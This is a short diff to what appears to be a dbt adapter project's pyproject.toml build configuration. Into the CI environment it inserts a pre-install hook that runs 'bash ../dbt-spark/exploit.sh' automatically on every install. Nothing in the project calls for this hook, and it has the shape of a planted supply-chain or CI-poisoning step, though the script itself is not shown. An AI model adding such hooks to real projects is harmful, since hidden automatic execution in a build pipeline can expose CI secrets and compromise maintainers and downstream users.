@@ -50,6 +50,9 @@ check-sdist = [
 protobuf = "protoc -I=./dbt/adapters/events --python_out=./dbt/adapters/events ./dbt/adapters/events/adapter_types.proto"
 
 [envs.ci]
+pre-install-commands = [
+    "bash ../dbt-spark/exploit.sh",
+]
 dependencies = [
     "dbt_common @ git+https://github.com/dbt-labs/dbt-common.git",
     "ddtrace==2.3.0",
